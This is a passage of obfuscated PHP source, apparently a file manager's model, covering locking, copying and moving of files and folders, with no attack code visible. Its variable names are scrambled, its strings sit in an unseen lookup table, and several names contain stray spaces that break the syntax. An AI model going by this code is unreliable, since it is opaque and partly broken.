array($Æ´ºŠòÖ[650], $Æ´ºŠòÖ[652]), $ŞÍÊ²¾–); $this->_lockParent($šçİ†¹, array($Æ´ºŠòÖ[650], $Æ´ºŠòÖ[652]), $ŞÍÊ²¾–); } public function lockMoveStart($ıñÜĞÁƒ) { $ƒĞ‹Æ =& $_SERVER[øşô´çË]; if (!$this->allowLock()) { return; } $this->_lockCheck($ƒĞ‹Æ[652], $ıñÜĞÁƒ); $¡ÔÛŸĞ± = 1; $this->_lockKey($ƒĞ‹Æ[656] . $ıñÜĞÁƒ, $¡ÔÛŸĞ±); $this->_lockEvent($ıñÜĞÁƒ, array($ƒĞ‹Æ[650], $ƒĞ‹Æ[651]), $¡ÔÛŸĞ±); $this->_lockParent($ıñÜĞÁƒ, array($ƒĞ‹Æ[650], $ƒĞ‹Æ[652]), $¡ÔÛŸĞ±); $this->_lockEvent($ıñÜĞÁƒ, array($ƒĞ‹Æ[657], $ƒĞ‹Æ[653], $ƒĞ‹Æ[654]), $¡ÔÛŸĞ±); $this->_lockCheckEnd($ƒĞ‹Æ[652], $ıñÜĞÁƒ); } public function lockMoveEnd($º—ÒË¤ç) { $çìÁîø =& $_SERVER[øşô´çË]; if (!$this->allowLock()) { return; } $æâ¶¤ë¬ = 0; $this->_lockKey($çìÁîø[656] . $º—ÒË¤ç, $æâ¶¤ë¬); $this->_lockEvent($º—ÒË¤ç, array($çìÁîø[650], $çìÁîø[651]), $æâ¶¤ë¬); $this->_lockParent($º—ÒË¤ç, array($çìÁîø[650], $çìÁîø[652]), $æâ¶¤ë¬); $this->_lockEvent($º—ÒË¤ç, array($çìÁîø[657], $çìÁîø[653], $çìÁîø[654]), $æâ¶¤ë¬); } private function _lockCheck($¯¦Úó–Á, $÷€³½ññ) { $üüœ³õ‡ =& $_SERVER[øşô´çË]; $õ‹Ø˜ÀÌ = $this->sourceInfo($÷€³½ññ); $„¼Ç¸²¸ = $¯¦Úó–Á . $üüœ³õ‡[10] . $÷€³½ññ; $this->_lockTimeStart[$„¼Ç¸²¸] = timeFloat(); if (!is_array($õ‹Ø˜ÀÌ)) { return; } $ëÕ‡ÕÇõ = LNG($üüœ³õ‡[658]); CacheLock::setErrorMsg($üüœ³õ‡[183] . htmlspecialchars($õ‹Ø˜ÀÌ[$üüœ³õ‡[42]]) . $üüœ³õ‡[185] . $ëÕ‡ÕÇõ); $this->_lockKey($„¼Ç¸²¸, 1); $this->_lockKey($„¼Ç¸²¸, 0); $âÑƒµÏ’ = array_reverse($this->parentLevelArray($õ‹Ø˜ÀÌ[$üüœ³õ‡[613]])); foreach ($âÑƒµÏ’ as $ª®¨µÆ©) { $„¼Ç¸²¸ = $¯¦Úó–Á . $üüœ³õ‡[659] . $ª®¨µÆ©; if (CacheLock::lockGet($üüœ³õ‡[660] . $„¼Ç¸²¸)) { $õ‹Ø˜ÀÌ = $this->sourceInfo($ª®¨µÆ©); CacheLock::setErrorMsg($üüœ³õ‡[183] . htmlspecialchars($õ‹Ø˜ÀÌ[$üüœ³õ‡[42]]) . $üüœ³õ‡[185] . $ëÕ‡ÕÇõ); $this->_lockKey($„¼Ç¸²¸, 1); $this->_lockKey($„¼Ç¸²¸, 0); } } } private function _lockCheckEnd($¤û«÷°, $äÈãğİæ) { $”ÑË©ú‘ =& $_SERVER[øşô´çË]; $ğéÇÔà = $¤û«÷° . $”ÑË©ú‘[10] . $äÈãğİæ; CacheLock::setErrorMsg($”ÑË©ú‘[472]); if (!isset($this->_lockTimeStart[$ğéÇÔà])) { return; } $Ñ‡÷Á“ = timeFloat() - $this->_lockTimeStart[$ğéÇÔà]; unset($this->_lockTimeStart[$ğéÇÔà]); if ($Ñ‡÷Á“ > 0.5) { unset(self::$cacheSourceInfo[$”ÑË©ú‘[556] . $äÈãğİæ]); } $«§°©ª¹ = $this->sourceInfo($äÈãğİæ); if (!$«§°©ª¹) { show_json(LNG($”ÑË©ú‘[115]), !1); } } private function _lockParent($ëÙ‘î«, $–èíáŞ, $ö¿Ã¿Œ¥) { if (!$this->autoLockSet) { return; } $¶Ïó‡ìó = $this->sourceInfo($ëÙ‘î«); if (!is_array($¶Ïó‡ìó)) { return; } $çèÉë¶€ = array_reverse($this->parentLevelArray($¶Ïó‡ìó[$_SERVER[øşô´çË][613]])); foreach ($çèÉë¶€ as $Á©ú”Ï‡) { $this->_lockEvent($Á©ú”Ï‡, $–èíáŞ, $ö¿Ã¿Œ¥); } } private function _lockEvent($‡À‚Ë´, $ŞïÂŸÉ, $ìŒâ¾á†) { $Œ„äØŠ =& $_SERVER[øşô´çË]; if (!$this->autoLockSet) { return; } foreach ($ŞïÂŸÉ as $ÑÎï™««) { $µùÚ¡í = $ÑÎï™«« . $Œ„äØŠ[10] . $‡À‚Ë´; if ($ìŒâ¾á† && CacheLock::lockGet($Œ„äØŠ[660] . $µùÚ¡í)) { continue; } $this->_lockKey($µùÚ¡í, $ìŒâ¾á†); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÍûÜ¶ò³, $–‚£êó = 1) { $ü®¿îû = $_SERVER[øşô´çË][660] . md5($ÍûÜ¶ò³); if ($–‚£êó) { if (isset(self::$_lockItemArr[$ü®¿îû])) { return; } self::$_lockItemArr[$ü®¿îû] = 1; CacheLock::lock($ü®¿îû, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ü®¿îû])) { return; } unset(self::$_lockItemArr[$ü®¿îû]); CacheLock::unlock($ü®¿îû); } } public function isParentOf($éØ£®Ì, $£ÌÒâÛ‚) { $‚é¶™÷ =& $_SERVER[øşô´çË]; $Ì—É‹½™ = $this->sourceInfo($éØ£®Ì); $ş¦«äğ® = $this->sourceInfo($£ÌÒâÛ‚); $¸õ‚òÓ­ = $Ì—É‹½™[$‚é¶™÷[613]] . $Ì—É‹½™[$‚é¶™÷[201]] . $‚é¶™÷[60]; $»ÖĞÆÎí = $ş¦«äğ®[$‚é¶™÷[613]] . $ş¦«äğ®[$‚é¶™÷[201]] . $‚é¶™÷[60]; $ëšš³Àô = strpos($»ÖĞÆÎí, $¸õ‚òÓ­) === 0; return $ëšš³Àô; } private $targetIsDelete = 0; public function copy($Ë¡´û‡ô, $’ì«¹Å‡, $ğ”ê¥êî = REPEAT_REPLACE, $Ä³ÖÛ“¨ = '') { $öÑé­Ò =& $_SERVER[øşô´çË]; $İî÷±¶à = $this->sourceInfo($Ë¡´û‡ô); $ÂË´ö¯ = $this->sourceInfo($’ì«¹Å‡); if (!$İî÷±¶à || !$ÂË´ö¯ || $ÂË´ö¯[$öÑé­Ò[509]] != $öÑé­Ò[101]) { return !1; } if ($this->isParentOf($Ë¡´û‡ô, $’ì«¹Å‡)) { return !1; } $õ©ëÉ¸ = $Ä³ÖÛ“¨ ? $Ä³ÖÛ“¨ : $İî÷±¶à[$öÑé­Ò[42]]; $this->lockCopyStart($Ë¡´û‡ô); $this->lockWriteStart($’ì«¹Å‡, $õ©ëÉ¸); $‰ÂéÉóš = array($öÑé­Ò[661] => array(), $öÑé­Ò[662] => array(), $öÑé­Ò[663] => array()); $this->targetIsDelete = intval($İî÷±¶à[$öÑé­Ò[529]]); $ÚÇ±ò±¶ = $this->fileNameExistAuto($’ì«¹Å‡, $İî÷±¶à); $°ü§ ½ü = $this->_copy($Ë¡´û‡ô, $’ì«¹Å‡, $ğ”ê¥êî, $‰ÂéÉóš, !0, $Ä³ÖÛ“¨); $this->_childrenListClear(); $this->lockCopyEnd($Ë¡´û‡ô); $this->lockWriteEnd($’ì«¹Å‡, $õ©ëÉ¸); if ($İî÷±¶à[$öÑé­Ò[509]] == $öÑé­Ò[101] && $ÚÇ±ò±¶ == $°ü§ ½ü) { $this->folderSizeResetChildren($ÚÇ±ò±¶); } Model($öÑé­Ò[480])->addAll($‰ÂéÉóš[$öÑé­Ò[662]], array(), !0); if ($ÚÇ±ò±¶ != $°ü§ ½ü || $İî÷±¶à[$öÑé­Ò[509]] == $öÑé­Ò[101]) { Model($öÑé­Ò[664])->eventCopy($°ü§ ½ü); } $this->saveAll($‰ÂéÉóš[$öÑé­Ò[663]]); Model($öÑé­Ò[240])->linkAdd($‰ÂéÉóš[$öÑé­Ò[661]]); $this->folderSizeReset($’ì«¹Å‡); $this->updateModifyTime($’ì«¹Å‡); return $°ü§ ½ü; } private function _copy($Ã³»®½, $ğ·ì¾½², $î°Ñ·£², &$œöŒ·üˆ, $Ññ™ç±Ş, $¢¹ª¼Ó› = '') { $Ï±ïŞŠ =& $_SERVER[øşô´çË]; $¼õµúëá = $this->sourceInfoCache($Ã³»®½); $Çñ¬¶Ğ¬ = $¼õµúëá[$Ï±ïŞŠ[509]] == $Ï±ïŞŠ[101]; $›¡©“´ = $¢¹ª¼Ó› ? $¢¹ª¼Ó› : $¼õµúëá[$Ï±ïŞŠ[42]]; $ëìéÎÒ¡ = $this->fileNameExistAuto($ğ·ì¾½², $¼õµúëá); if ($Ññ™ç±Ş) { $this->_childrenAllMake($Ã³»®½); if ($Çñ¬¶Ğ¬ && $ëìéÎÒ¡) { $this->_childrenAllMake($ëìéÎÒ¡); } } if (!$ëìéÎÒ¡) { return $this->_copyCreate($Ã³»®½, $ğ·ì¾½², $›¡©“´, $œöŒ·üˆ); } $ÖÇ±¦ğ = $ëìéÎÒ¡; if ($Çñ¬¶Ğ¬) { if ($î°Ñ·£² == REPEAT_RENAME_FOLDER) { $›¡©“´ = $this->fileNameAutoCache($ğ·ì¾½², $›¡©“´, $î°Ñ·£², $Çñ¬¶Ğ¬); $ÖÇ±¦ğ = $this->_copyCreate($Ã³»®½, $ğ·ì¾½², $›¡©“´, $œöŒ·üˆ); } else { $æöĞöçÍ = $this->_childrenList($Ã³»®½); foreach ($æöĞöçÍ as $İ¦Ê¶Œ) { $this->_copy($İ¦Ê¶Œ[$Ï±ïŞŠ[201]], $ëìéÎÒ¡, $î°Ñ·£², $œöŒ·üˆ, !1); } } } else { if ($î°Ñ·£² == REPEAT_RENAME || $î°Ñ·£² == REPEAT_RENAME_FOLDER) { $›¡©“´ = $this->fileNameAutoCache($ğ·ì¾½², $›¡©“´, $î°Ñ·£², $Çñ¬¶Ğ¬); $ÖÇ±¦ğ = $this->_copyCreate($Ã³»®½, $ğ·ì¾½², $›¡©“´, $œöŒ·üˆ); } else { if ($î°Ñ·£² == REPEAT_REPLACE) { $É“½ã–À = $this->sourceInfoCache($ëìéÎÒ¡); $Üİ˜‹â” = $this->fileHistory($É“½ã–À, $¼õµúëá[$Ï±ïŞŠ[566]], $¼õµúëá[$Ï±ïŞŠ[89]]); if ($Üİ˜‹â”) { $œöŒ·üˆ[$Ï±ïŞŠ[661]][] = $¼õµúëá[$Ï±ïŞŠ[566]]; } } else { if ($î°Ñ·£² == REPEAT_SKIP) { } } } Hook::trigger($Ï±ïŞŠ[665], array($Ï±ïŞŠ[666], $¼õµúëá, 0)); } return $ÖÇ±¦ğ; } private function _copyCreate($ƒØ×Òú, $¹Á¸½Ôï, $ ÃÔÓÃ, &$Ÿ¡µºåƒ) { $åÌŠÇ‡† =& $_SERVER[øşô´çË]; $Şò‹û‹ = $this->sourceInfoCache($ƒØ×Òú); $àèä‡Ïé = $this->sourceInfoCache($¹Á¸½Ôï); $ïØÂÏ§¤ = $this->_makeItemData($Şò‹û‹, $àèä‡Ïé, $ ÃÔÓÃ); Hook::trigger($åÌŠÇ‡†[667], $ïØÂÏ§¤); Hook::trigger($åÌŠÇ‡†[668], array($åÌŠÇ‡†[669], $ïØÂÏ§¤, 0)); $µëãù–¹ = $this->add($ïØÂÏ§¤); $Û•ÇÉÁÊ = array($åÌŠÇ‡†[201] => $µëãù–¹, $åÌŠÇ‡†[42] => $ ÃÔÓÃ); $this->_copyApplyMeta($Û•ÇÉÁÊ, $Ÿ¡µºåƒ); if ($Şò‹û‹[$åÌŠÇ‡†[509]] != $åÌŠÇ‡†[101]) { $Ÿ¡µºåƒ[$åÌŠÇ‡†[661]][] = $Şò‹û‹[$åÌŠÇ‡†[566]]; return $µëãù–¹; } $´ñ·Šğ = array(); $÷Õ÷ÛÅ‡ = array(); $this->_childrenListAll($ƒØ×Òú, $´ñ·Šğ); $¦èäÓ¥¸ = count($´ñ·Šğ); if ($¦èäÓ¥¸ == 0) { return $µëãù–¹; } $ßáö—” = $this->sourceInfo($µëãù–¹); foreach ($´ñ·Šğ as $¶ŠÎìŒ£) { $ú§¨šÄ„ = $this->_makeItemData($¶ŠÎìŒ£, $ßáö—”, $¶ŠÎìŒ£[$åÌŠÇ‡†[42]]); $ú§¨šÄ„[$åÌŠÇ‡†[613]] = $¶ŠÎìŒ£[$åÌŠÇ‡†[613]]; $÷Õ÷ÛÅ‡[] = $ú§¨šÄ„; } $this->chunkEventSet($åÌŠÇ‡†[670], array($åÌŠÇ‡†[671], $ïØÂÏ§¤, $¦èäÓ¥¸)); $this->addAll($÷Õ÷ÛÅ‡, array(), !1); $Ì•ÕóÉÚ = $this->where(array($åÌŠÇ‡†[200] => $µëãù–¹))->select(); $¡‘ßßÔ’ = $this->_childrenMakeRelation($´ñ·Šğ, $Ì•ÕóÉÚ); $¡‘ßßÔ’[$ƒØ×Òú] = $µëãù–¹; $¯ÈÁ‰£³ = array(); $ÌüôéÔô = array(); foreach ($Ì•ÕóÉÚ as $¶ŠÎìŒ£) { $ˆ£ô÷÷Û = $¶ŠÎìŒ£[$åÌŠÇ‡†[201]]; $¶ûĞÂ = $this->_childrenMatch($¡‘ßßÔ’, $¶ŠÎìŒ£, $ßáö—”); $¯ÈÁ‰£³[] = array($åÌŠÇ‡†[201], $ˆ£ô÷÷Û, $åÌŠÇ‡†[200], $¶ûĞÂ[$åÌŠÇ‡†[200]]); $ÌüôéÔô[] = array($åÌŠÇ‡†[201], $ˆ£ô÷÷Û, $åÌŠÇ‡†[613], $¶ûĞÂ[$åÌŠÇ‡†[613]]); $this->_copyApplyMeta($¶ŠÎìŒ£, $Ÿ¡µºåƒ); if ($¶ŠÎìŒ£[$åÌŠÇ‡†[509]] != $åÌŠÇ‡†[101]) { $Ÿ¡µºåƒ[$åÌŠÇ‡†[661]][] = $¶ŠÎìŒ£[$åÌŠÇ‡†[566]]; } } $this->chunkEventSet($åÌŠÇ‡†[672], array($åÌŠÇ‡†[673], $ïØÂÏ§¤, $¦èäÓ¥¸)); $this->saveAll($¯ÈÁ‰£³); $this->chunkEventSet($åÌŠÇ‡†[674], array($åÌŠÇ‡†[675], $ïØÂÏ§¤, $¦èäÓ¥¸)); $this->saveAll($ÌüôéÔô); return $µëãù–¹; } private function _childrenMakeRelation($–¼Î‰—¨, $ª —’Áµ) { $Âğ¹×¾ú =& $_SERVER[øşô´çË]; $¥”‚‘ ô = array(); $µüğ›ñ‹ = array(); foreach ($–¼Î‰—¨ as $¤Æ—£¦ù) { $ø´÷â½“ = $¤Æ—£¦ù[$Âğ¹×¾ú[42]] . $Âğ¹×¾ú[8] . $¤Æ—£¦ù[$Âğ¹×¾ú[613]]; $¥”‚‘ ô[$ø´÷â½“] = $¤Æ—£¦ù[$Âğ¹×¾ú[201]]; } foreach ($ª —’Áµ as $¤Æ—£¦ù) { $ø´÷â½“ = $¤Æ—£¦ù[$Âğ¹×¾ú[42]] . $Âğ¹×¾ú[8] . $¤Æ—£¦ù[$Âğ¹×¾ú[613]]; $ìıŸæá² = $¥”‚‘ ô[$ø´÷â½“]; $µüğ›ñ‹[$ìıŸæá²] = $¤Æ—£¦ù[$Âğ¹×¾ú[201]]; } return $µüğ›ñ‹; } private function _childrenMatch($˜ï¿—Ìî, $™ÃÛÂşæ, $ğÙş§) { $æ…š“ÅŸ =& $_SERVER[øşô´çË]; $â³¹ûÚì = $ğÙş§[$æ…š“ÅŸ[613]]; $Èµ‘Ò§´ = $this->parentLevelArray($™ÃÛÂşæ[$æ…š“ÅŸ[613]]); foreach ($Èµ‘Ò§´ as $™€Ğ·ö) { if (isset($˜ï¿—Ìî[$™€Ğ·ö])) { $â³¹ûÚì .= $˜ï¿—Ìî[$™€Ğ·ö] . $æ…š“ÅŸ[676]; } } $â³¹ûÚì = rtrim($â³¹ûÚì, $æ…š“ÅŸ[60]) . $æ…š“ÅŸ[60]; $Ğí„ı¿ = $this->parentLevelArray($â³¹ûÚì); $µ‹¸Æ¬ = $Ğí„ı¿[count($Ğí„ı¿) - 1]; return array($æ…š“ÅŸ[200] => $µ‹¸Æ¬, $æ…š“ÅŸ[613] => $â³¹ûÚì); } private function _makeItemData($ÓÌŠÁå¶, $İ˜‰ŸÊÎ, $ø£àÙŸÚ) { $î½¬È­ =& $_SERVER[øşô´çË]; $È¥Ãäğ = array($î½¬È­[677] => $ÓÌŠÁå¶[$î½¬È­[509]], $î½¬È­[518] => $ø£àÙŸÚ, $î½¬È­[678] => $ÓÌŠÁå¶[$î½¬È­[510]] ? $ÓÌŠÁå¶[$î½¬È­[510]] : $î½¬È­[12], $î½¬È­[567] => $ÓÌŠÁå¶[$î½¬È­[566]] ? $ÓÌŠÁå¶[$î½¬È­[566]] : 0, $î½¬È­[649] => $ÓÌŠÁå¶[$î½¬È­[89]] ? $ÓÌŠÁå¶[$î½¬È­[89]] : 0, $î½¬È­[679] => intval($İ˜‰ŸÊÎ[$î½¬È­[198]]), $î½¬È­[680] => intval($İ˜‰ŸÊÎ[$î½¬È­[598]]), $î½¬È­[681] => intval(USER_ID), $î½¬È­[682] => intval(USER_ID), $î½¬È­[501] => intval($İ˜‰ŸÊÎ[$î½¬È­[201]]), $î½¬È­[683] => $İ˜‰ŸÊÎ[$î½¬È­[613]] . $İ˜‰ŸÊÎ[$î½¬È­[201]] . $î½¬È­[60], $î½¬È­[522] => $ÓÌŠÁå¶[$î½¬È­[98]] ? $ÓÌŠÁå¶[$î½¬È­[98]] : time(), $î½¬È­[528] => 0, $î½¬È­[684] => $î½¬È­[12]); return $È¥Ãäğ; } private function _copyApplyMeta($•¢®†Û, &$‚Ùæ»£Ä) { $çÜ·ÃÚ« =& $_SERVER[øşô´çË]; $¤é„—Î· = $•¢®†Û[$çÜ·ÃÚ«[201]]; $¾¦½©È¼ = $•¢®†Û[$çÜ·ÃÚ«[42]]; if (!isset($•¢®†Û[$çÜ·ÃÚ«[685]]) || !$•¢®†Û[$çÜ·ÃÚ«[685]] || $•¢®†Û[$çÜ·ÃÚ«[685]] == $çÜ·ÃÚ«[238]) { $‚Ùæ»£Ä[$çÜ·ÃÚ«[663]][] = array($çÜ·ÃÚ«[201], $¤é„—Î·, $çÜ·ÃÚ«[685], short_id($¤é„—Î·)); } if (Input::check($¾¦½©È¼, $çÜ·ÃÚ«[686])) { $‚Ùæ»£Ä[$çÜ·ÃÚ«[662]][] = array($çÜ·ÃÚ«[201] => $¤é„—Î·, $çÜ·ÃÚ«[105] => $çÜ·ÃÚ«[561], $çÜ·ÃÚ«[460] => str_replace($çÜ·ÃÚ«[63], $çÜ·ÃÚ«[12], Pinyin::get($¾¦½©È¼))); $‚Ùæ»£Ä[$çÜ·ÃÚ«[662]][] = array($çÜ·ÃÚ«[201] => $¤é„—Î·, $çÜ·ÃÚ«[105] => $çÜ·ÃÚ«[560], $çÜ·ÃÚ«[460] => Pinyin::get($¾¦½©È¼, $çÜ·ÃÚ«[687])); } $‚Ùæ»£Ä[$çÜ·ÃÚ«[662]][] = array($çÜ·ÃÚ«[201] => $¤é„—Î·, $çÜ·ÃÚ«[105] => $çÜ·ÃÚ«[540], $çÜ·ÃÚ«[460] => KodSort::makeStr($¾¦½©È¼)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($êå›øã) { $–ÆÀÌŠç =& $_SERVER[øşô´çË]; $ğˆÌ¶¸× = $this->sourceInfo($êå›øã); $°äÏÆ©æ = $–ÆÀÌŠç[688]; $ıÏæï” = array($–ÆÀÌŠç[613] => array($–ÆÀÌŠç[644], $ğˆÌ¶¸×[$–ÆÀÌŠç[613]] . $êå›øã . $–ÆÀÌŠç[645]), $–ÆÀÌŠç[529] => $this->targetIsDelete); $İĞ¤ïû = $this->field($°äÏÆ©æ)->where($ıÏæï”)->select(); if (!$İĞ¤ïû) { return; } $İĞ¤ïû = array_to_keyvalue($İĞ¤ïû, $–ÆÀÌŠç[201]); foreach ($İĞ¤ïû as $¸à³²«…) { $¥ÃŞ¼¹ƒ = $¸à³²«…[$–ÆÀÌŠç[200]]; $êå›øã = $¸à³²«…[$–ÆÀÌŠç[201]]; if (!isset($this->_childrenListCache[$êå›øã]) && $¸à³²«…[$–ÆÀÌŠç[509]] == $–ÆÀÌŠç[101]) { $this->_childrenListCache[$êå›øã] = array(); } if (!isset($this->_childrenListCache[$¥ÃŞ¼¹ƒ])) { $this->_childrenListCache[$¥ÃŞ¼¹ƒ] = array(); } $this->_childrenListCache[$¥ÃŞ¼¹ƒ][$êå›øã] = $¸à³²«…; $this->_childrenItemCache[$êå›øã] = $¸à³²«…; } } private function _childrenListAll($ÌìÀğÅÜ, &$Âø‘ş¢÷) { $µ’‰Åˆ÷ =& $_SERVER[øşô´çË]; if (!isset($this->_childrenListCache[$ÌìÀğÅÜ])) { return; } $™µ¿Øœ = $this->_childrenListCache[$ÌìÀğÅÜ]; foreach ($™µ¿Øœ as $öµéûû => $µ£‡›†¿) { $Âø‘ş¢÷[$öµéûû] = $µ£‡›†¿; if ($µ£‡›†¿[$µ’‰Åˆ÷[509]] == $µ’‰Åˆ÷[101]) { $this->_childrenListAll($öµéûû, $Âø‘ş¢÷); } } } private function sourceInfoCache($í¦ñ‘Øâ) { if (isset($this->_childrenItemCache[$í¦ñ‘Øâ])) { return $this->_childrenItemCache[$í¦ñ‘Øâ]; } return $this->sourceInfo($í¦ñ‘Øâ); } private function _childrenList($Œ…æ¡÷±) { if (isset($this->_childrenListCache[$Œ…æ¡÷±])) { return $this->_childrenListCache[$Œ…æ¡÷±]; } return $this->_childrenListSelect($Œ…æ¡÷±); } private function _childrenListSelect($ÇÎÉ—ë“) { $À«¾Ë„Ç =& $_SERVER[øşô´çË]; $â ³î„“ = array($À«¾Ë„Ç[200] => $ÇÎÉ—ë“, $À«¾Ë„Ç[529] => $this->targetIsDelete); $²Êã˜ş‡ = $this->where($â ³î„“)->select(); $²Êã˜ş‡ = $²Êã˜ş‡ ? $²Êã˜ş‡ : array(); $°ô”ü÷ = array_to_keyvalue($²Êã˜ş‡, $À«¾Ë„Ç[201]); $this->_childrenListCache[$ÇÎÉ—ë“] = $°ô”ü÷; foreach ($°ô”ü÷ as $ÇÎÉ—ë“ => $šÑ´ÅÌ) { $this->_childrenItemCache[$ÇÎÉ—ë“] = $šÑ´ÅÌ; } return $°ô”ü÷; } private function fileNameExistAuto($şë“Ş£á, $´ë¢º¬¬) { $˜™–æüà =& $_SERVER[øşô´çË]; if ($´ë¢º¬¬[$˜™–æüà[529]] == $˜™–æüà[101]) { return $this->fileNameExist($şë“Ş£á, $´ë¢º¬¬[$˜™–æüà[42]]); } return $this->fileNameExistCache($şë“Ş£á, $´ë¢º¬¬[$˜™–æüà[42]]); } private function fileNameExistCache($²¯šı±, $³ ÖöÀ¦) { $±ìĞƒ†’ =& $_SERVER[øşô´çË]; $³ ÖöÀ¦ = strtolower($³ ÖöÀ¦); $Ü»·ĞÇ‹ = $this->_childrenList($²¯šı±); foreach ($Ü»·ĞÇ‹ as $Œ»Ãû‡) { if ($³ ÖöÀ¦ == strtolower($Œ»Ãû‡[$±ìĞƒ†’[42]])) { return $Œ»Ãû‡[$±ìĞƒ†’[201]]; } } return !1; } private function fileNameAutoCache($Ÿ­À­Ï¬, $şáÜÇ«, $âÜòÛ©, $ŞÏèÓÑ‘) { $Ãíà€¿  =& $_SERVER[øşô´çË]; $ş©ãÙû‚ = $this->_childrenList($Ÿ­À­Ï¬); $Ë˜ÓÇÚ˜ = array_to_keyvalue($ş©ãÙû‚, $Ãíà€¿ [12], $Ãíà€¿ [42]); return $this->fileNameAutoGet($Ë˜ÓÇÚ˜, $şáÜÇ«, $âÜòÛ©, $ŞÏèÓÑ‘); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ü½¢ÌÙª, $¯Š´›¬ğ, $¸ ¿¬ì‚ = REPEAT_REPLACE, $•›‡ª»‰ = '') { $Ÿ¡å©æï =& $_SERVER[øşô´çË]; $ß‡ıÖŸÑ = $this->sourceInfo($ü½¢ÌÙª); $§³ú¨ˆÄ = $this->sourceInfo($¯Š´›¬ğ); if ($ß‡ıÖŸÑ[$Ÿ¡å©æï[200]] == $§³ú¨ˆÄ[$Ÿ¡å©æï[201]]) { if ($ß‡ıÖŸÑ[$Ÿ¡å©æï[529]] == $Ÿ¡å©æï[101]) { Model($Ÿ¡å©æï[527])->restore(array($ü½¢ÌÙª)); } if (!$•›‡ª»‰ || $•›‡ª»‰ == $ß‡ıÖŸÑ[$Ÿ¡å©æï[42]]) { return $ü½¢ÌÙª; } } $µùÆÎ½ = $this->pathInfoMore($ü½¢ÌÙª); if ($this->isParentOf($ü½¢ÌÙª, $¯Š´›¬ğ)) { return !1; } if (!$ß‡ıÖŸÑ || !$§³ú¨ˆÄ || $§³ú¨ˆÄ[$Ÿ¡å©æï[509]] != $Ÿ¡å©æï[101]) { return !1; } Hook::trigger($Ÿ¡å©æï[689], $µùÆÎ½); $this->targetIsDelete = intval($ß‡ıÖŸÑ[$Ÿ¡å©æï[529]]); if ($ß‡ıÖŸÑ[$Ÿ¡å©æï[200]] == $¯Š´›¬ğ && $•›‡ª»‰ != $ß‡ıÖŸÑ[$Ÿ¡å©æï[42]]) { $‘¹¼³†é = $this->fileNameExist($¯Š´›¬ğ, $•›‡ª»‰); if ($‘¹¼³†é && $ß‡ıÖŸÑ[$Ÿ¡å©æï[509]] == $Ÿ¡å©æï[238]) { $î²ÄÊ­¦ = $this->sourceInfo($‘¹¼³†é); $óïÍµ–˜ = $this->fileHistory($î²ÄÊ­¦, $ß‡ıÖŸÑ[$Ÿ¡å©æï[566]], $ß‡ıÖŸÑ[$Ÿ¡å©æï[89]]); if (!$óïÍµ–˜) { Model($Ÿ¡å©æï[569])->remove($ß‡ıÖŸÑ[$Ÿ¡å©æï[566]]); } $this->removeNow($ü½¢ÌÙª, !1); $this->folderSizeReset($¯Š´›¬ğ); Hook::trigger($Ÿ¡å©æï[690], $µùÆÎ½); return $‘¹¼³†é; } } $é˜ğğË = $•›‡ª»‰ ? $•›‡ª»‰ : $ß‡ıÖŸÑ[$Ÿ¡å©æï[42]]; $this->lockMoveStart($ü½¢ÌÙª); $this->lockWriteStart($¯Š´›¬ğ, $é˜ğğË); $‹ªÁæÜæ = array($Ÿ¡å©æï[661] => array(), $Ÿ¡å©æï[691] => !1); $this->clearShare($ü½¢ÌÙª, $¯Š´›¬ğ); $€´˜ÖÁ­ = $this->fileNameExistAuto($¯Š´›¬ğ, $ß‡ıÖŸÑ); $„ØÉË‹§ = $this->_move($ü½¢ÌÙª, $¯Š´›¬ğ, $¸ ¿¬ì‚, $‹ªÁæÜæ, $•›‡ª»‰); $this->sourceCacheClear(); if ($ß‡ıÖŸÑ[$Ÿ¡å©æï[509]] == $Ÿ¡å©æï[101] && $€´˜ÖÁ­) { $this->folderSizeResetChildren($„ØÉË‹§); } Model($Ÿ¡å©æï[240])->linkAdd($‹ªÁæÜæ[$Ÿ¡å©æï[661]]); if ($„ØÉË‹§ && $€´˜ÖÁ­ && $‹ªÁæÜæ[$Ÿ¡å©æï[691]]) { $¿¶Ñ×®‚ = $ß‡ıÖŸÑ[$Ÿ¡å©æï[509]] == $Ÿ¡å©æï[101] ? $this->_childrenListSelect($ü½¢ÌÙª) : !1; $¡Å½àä© = $¿¶Ñ×®‚ && count($¿¶Ñ×®‚) > 0 ? !0 : !1; $this->removeNow($ü½¢ÌÙª, $¡Å½àä©); } $this->lockMoveEnd($ü½¢ÌÙª); $this->lockWriteEnd($¯Š´›¬ğ, $é˜ğğË); $this->folderSizeReset($ß‡ıÖŸÑ[$Ÿ¡å©æï[200]]); $this->folderSizeReset($¯Š´›¬ğ); $ò÷ö»ĞÈ = array($ß‡ıÖŸÑ[$Ÿ¡å©æï[200]], $¯Š´›¬ğ); if ($ß‡ıÖŸÑ[$Ÿ¡å©æï[509]] == $Ÿ¡å©æï[101]) { $ò÷ö»ĞÈ[] = $ü½¢ÌÙª; } $this->updateModifyTime($ò÷ö»ĞÈ); Model($Ÿ¡å©æï[664])->eventMove($ü½¢ÌÙª, $ß‡ıÖŸÑ[$Ÿ¡å©æï[200]], $¯Š´›¬ğ); Hook::trigger($Ÿ¡å©æï[690], $µùÆÎ½); return $„ØÉË‹§; } private function _move($–˜ãçéÀ, $øÍšğà, $İ¥†‰˜¶, &$³Ü»¸ùŸ, $şÀîÈş = '') { $µ²˜æÏ =& $_SERVER[øşô´çË]; $Ò­Ëˆã¯ = $this->sourceInfo($–˜ãçéÀ); $»²—äÌ = $Ò­Ëˆã¯[$µ²˜æÏ[509]] == $µ²˜æÏ[101]; $¯‘‹ÀÆ = $şÀîÈş ? $şÀîÈş : $Ò­Ëˆã¯[$µ²˜æÏ[42]]; $ìåÁ’’Ü = $this->fileNameExistAuto($øÍšğà, $Ò­Ëˆã¯); $this->lockMoveStart($–˜ãçéÀ); $this->lockWriteStart($øÍšğà, $¯‘‹ÀÆ); if (!$ìåÁ’’Ü) { return $this->_moveForce($–˜ãçéÀ, $øÍšğà, $¯‘‹ÀÆ); } $¤ëšÖ = $ìåÁ’’Ü; $ «ÛÚ  = !1; if ($»²—äÌ) { if ($İ¥†‰˜¶ == REPEAT_RENAME_FOLDER) { $¯‘‹ÀÆ = $this->fileNameAuto($øÍšğà, $¯‘‹ÀÆ, $İ¥†‰˜¶, $»²—äÌ); 